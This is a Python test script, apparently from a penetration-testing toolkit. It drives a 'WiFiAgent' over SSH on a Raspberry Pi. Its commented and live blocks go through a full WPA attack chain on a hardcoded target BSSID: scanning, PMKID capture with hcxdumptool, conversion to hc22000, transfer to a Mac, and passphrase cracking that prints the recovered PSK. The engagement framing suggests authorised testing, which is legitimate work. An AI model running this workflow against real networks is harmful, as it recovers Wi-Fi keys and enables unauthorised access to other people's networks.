



# # test_wifi_ssh.py
# from agents.wifi_agent import WiFiAgent
# from core.engagement import EngagementContext

# agent = WiFiAgent()
# connected, err = agent._connect_pi()
# print(f"Connected: {connected}")
# print(f"Error: {err}")

# if connected:
#     exit_code, out, err = agent._ssh_run("whoami")
#     print(f"whoami: {out}")
#     agent._close_ssh()


# from agents.wifi_agent import WiFiAgent

# agent = WiFiAgent()
# agent._connect_pi()

# bssid = "70:f2:20:27:91:01"
# captured = agent._capture_pmkid(bssid)
# print(f"Captured: {captured}")

# if captured:
#     converted = agent._convert_capture()
#     print(f"Converted: {converted}")

# agent._close_ssh()


# from agents.wifi_agent import WiFiAgent

# agent = WiFiAgent()
# agent._connect_pi()

# bssid = "70:f2:20:27:91:01"
# captured = agent._capture_pmkid(bssid)
# converted = agent._convert_capture()
# local_path = agent._transfer_to_mac()
# print(f"Local path: {local_path}")

# agent._close_ssh()

# from agents.wifi_agent import WiFiAgent

# agent = WiFiAgent()
# psk = agent._crack_passphrase("/var/folders/nd/02f30b_s23l9ln7_zyhxb4ph0000gn/T/wifi_capture_crs9q8jc.hc22000")
# print(f"PSK: {psk}")




# from agents.wifi_agent import WiFiAgent

# agent = WiFiAgent()
# agent._connect_pi()

# bssid = "70:f2:20:27:91:01"
# captured = agent._capture_pmkid(bssid)
# print(f"Captured: {captured}")

# if captured:
#     converted = agent._convert_capture()
#     print(f"Converted: {converted}")

#     if converted:
#         local_path = agent._transfer_to_mac()
#         print(f"Local path: {local_path}")

#         if local_path:
#             psk = agent._crack_passphrase(local_path)
#             print(f"PSK: {psk}")

# agent._close_ssh()


# from agents.wifi_agent import WiFiAgent

# agent = WiFiAgent()
# agent._connect_pi()
# networks = agent._scan_networks()
# for n in networks:
#     print(n)
# agent._close_ssh()



from agents.wifi_agent import WiFiAgent

agent = WiFiAgent()
agent._connect_pi()

bssid = "d2:91:10:8e:84:e3"
bssid_no_colons = bssid.replace(":", "")

# Clean first
agent._ssh_run("sudo rm -f /tmp/capture.pcapng /tmp/capture.hc22000", timeout=5)

# Write BPF filter
agent._ssh_run(
    f"sudo hcxdumptool --bpfc=\"wlan addr3 {bssid_no_colons}\" > /tmp/filter.bpf",
    timeout=15
)

# Run capture and print raw output
command = "sudo timeout 30 hcxdumptool -i wlan1 -w /tmp/capture.pcapng --rds=2 2>&1"
ssh = agent._get_ssh()
stdin, stdout, stderr = ssh.exec_command(command, timeout=40)
stdout.channel.recv_exit_status()
raw = stdout.read().decode(errors="replace")
print("--- RAW OUTPUT ---")
print(raw)
print("--- END ---")

agent._close_ssh()
agent._close_ssh()

# from agents.wifi_agent import WiFiAgent

# agent = WiFiAgent()
# agent._connect_pi()

# # Check if old files exist
# exit_code, out, _ = agent._ssh_run("ls -la /tmp/capture.pcapng /tmp/capture.hc22000 2>&1")
# print(f"Before cleanup: {out}")

# # Run cleanup manually
# agent._ssh_run("rm -f /tmp/capture.pcapng /tmp/capture.hc22000", timeout=5)

# # Verify they're gone
# exit_code, out, _ = agent._ssh_run("ls -la /tmp/capture.pcapng /tmp/capture.hc22000 2>&1")
# print(f"After cleanup: {out}")

# agent._close_ssh()